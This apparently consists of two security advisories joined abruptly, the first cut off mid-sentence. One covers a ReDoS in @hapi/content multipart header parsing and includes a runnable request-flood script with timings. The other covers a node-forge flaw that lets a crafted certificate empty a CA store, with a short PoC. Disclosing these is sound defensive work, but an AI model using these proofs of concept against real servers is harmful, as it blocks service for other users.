### Summary

`Content.disposition()` takes quadratic time when a `Content-Disposition` parameter contains a long token without `=`. One unauthenticated multipart request can block the Node.js event loop for several minutes.

### Details

`Content.disposition()` reads the parameters with a global regular expression in `String.prototype.replace()`:

```js
/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;'"\s]+\'[\w-]*\'[^;\s]+)|(?:\"([^"]*)\")|([^;\s]*))/g
```

The parameter name part `([^\=\*\s]+)` has no anchor. When a run of name characters has no `=` after it, the match attempt reads the full run and fails. The global scan then starts again at the next character and reads the remaining run again. The total time is proportional to the square of the run length.

`@hapi/pez` calls `Content.disposition()` on the header of every part in a `multipart/form-data` body. In hapi, this occurs on each route with `payload.multipart` enabled, before the route handler and before any validation. The only size limit is the route `payload.maxBytes`, which is 1 MB by default.

The fix adds an alternative that matches the full run of name characters when no `=` follows it. The scan then continues after the run, and the callback ignores this match. A match attempt that starts later in the same run always fails in the same way, so the parse result does not change. The parse time is now linear.

```js
/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;'"\s]+\'[\w-]*\'[^;\s]+)|(?:\"([^"]*)\")|([^;\s]*))|[^\=\*\s]+/g
```

Every release from `3.0.6` (published as `content`) up to and including `@hapi/content` `6.0.2` is affected.

Workarounds: none that removes the risk, upgrade required. To reduce the delay for each request until you upgrade, set a low `payload.maxBytes` on routes that accept multipart payloads. A token of 64 KB still blocks the process for more than 1 second.

### Proof of concept

Install `@hapi/hapi` with `@hapi/content` `6.0.2`, then run:

```js
const Hapi = require('@hapi/hapi');
const Net = require('net');

const attack = (port, n) => new Promise((resolve) => {

    const body = `--x\r\nContent-Disposition: form-data; name="f"; ${'a'.repeat(n)}\r\n\r\nv\r\n--x--\r\n`;
    const req = `POST /upload HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: multipart/form-data; boundary=x\r\nContent-Length: ${Buffer.byteLength(body)}\r\nConnection: close\r\n\r\n${body}`;
    const start = process.hrtime.bigint();
    let res = '';
    const socket = Net.connect(port, '127.0.0.1', () => socket.write(req));
    socket.on('data', (chunk) => res += chunk);
    socket.on('close', () => resolve(`${n} byte token  HTTP ${res.split(' ')[1]}  ${(Number(process.hrtime.bigint() - start) / 1e9).toFixed(3)} s`));
});

(async () => {

    const server = Hapi.server({ host: '127.0.0.1', port: 7001 });
    server.route({
        method: 'POST',
        path: '/upload',
        options: {
            auth: false,
            payload: { multipart: { output: 'data' }, parse: true }
        },
        handler: () => ({ ok: true })
    });

    await server.start();
    for (const n of [32000, 64000, 128000]) {
        console.log(await attack(7001, n));
    }

    await server.stop();
})();
```

With `@hapi/content` `6.0.2`, the time increases by approximately four for each doubling of the token. During each request, the server does not answer other clients:

```text
32000 byte token  HTTP 200  0.424 s
64000 byte token  HTTP 200  1.670 s
128000 byte token  HTTP 200  7.173 s
```

The reporter measured 542 seconds for a token of 1,024,000 bytes, which is near the default `payload.maxBytes`.

With `@hapi/content` `6.0.3`:

```text
32000 byte token  HTTP 200  0.011 s
64000 byte token  HTTP 200  0.003 s
128000 byte token  HTTP 200  0.004 s
1024000 byte token  HTTP 200  0.013 s
```

### Impact

This is a denial of service through slow regular expression processing. It affects every hapi server with a route that accepts multipart payloads, and every application that gives untrusted headers to `Content.d

### Summary

When a CA store created by `pki.createCaStore()` holds two or more certificates with the same subject name, `pki.verifyCertificateChain()` permanently removes those certificates from the store while trying each one as the issuer. A peer can send any certificate that names that subject as its issuer to make all later verifications against those CA certificates fail. Fixed in node-forge 1.4.1.

### Details

`pki.verifyCertificateChain()` (`lib/x509.js`) asks the CA store for the issuer of each certificate with `caStore.getIssuer()`. When the store holds several certificates with the same subject, `caStore.getIssuer()` returns the store's own internal array of those certificates (`caStore.certs[hash]`, built by `addCertificate()`). `verifyCertificateChain()` used that array directly as its list of candidate parents and called `parents.shift()` on it while trying each candidate. Every candidate it tried, including the one that finally verified the certificate, was removed from the store.

Once the array is empty, `getIssuer()` returns an empty list, no candidate is tried, and verification fails with "Certificate signature is invalid." `hasCertificate()` and `listAllCertificates()` no longer see the removed certificates. The store stays in this state for as long as the object is used.

The attacker's certificate only needs an issuer name equal to the shared subject name, which is public. Its signature and key can be arbitrary: every candidate is tried and shifted out because none verifies, and errors from `parent.verify()` are caught by the loop. Verification of the attacker's chain fails as expected. Verifying valid chains has a similar effect: the CA certificate that verified the chain and any tried before it are removed.

No chain is accepted that should be rejected. Removing candidates can only turn a success into a failure.

RFC 5280, Section 6.1.1(d) treats trust anchor information as an input to path validation. Validation should not consume it.

The fix copies the array returned by `getIssuer()` before iterating over it, so the CA store is no longer modified. `getIssuer()` itself is unchanged.

### Patches
Fixed in node-forge 1.4.1. `pki.verifyCertificateChain()` now works on a copy of the candidate issuer list instead of shifting entries out of the CA store.

### Workarounds
- Pass a fresh CA store to each `pki.verifyCertificateChain()` call (for example `pki.createCaStore(trustedCerts)`), or pass `caStore` to `forge.tls.createConnection()` as an array of certificates instead of a store object, so that forge creates a new store per connection.
- Or wrap the store so that `getIssuer()` returns a copy:

      var getIssuer = caStore.getIssuer;
      caStore.getIssuer = function(cert) {
        var r = getIssuer(cert);
        return Array.isArray(r) ? r.slice() : r;
      };

### Proof of concept

Two trusted self-signed CA certificates, `rootA` and `rootB`, share the subject `CN=Root`. `bogus` is any certificate whose issuer is `CN=Root`, signed with an unrelated key. `leafA` is a valid certificate issued by `rootA`.

    var caStore = forge.pki.createCaStore([rootA, rootB]);
    caStore.listAllCertificates().length;  // 2
    try { forge.pki.verifyCertificateChain(caStore, [bogus]); } catch(e) {}
    // rejected as expected ("Certificate signature is invalid.")
    caStore.listAllCertificates().length;  // 0: both CA certificates are gone
    forge.pki.verifyCertificateChain(caStore, [leafA]);
    // throws "Certificate signature is invalid." (valid chain now rejected)

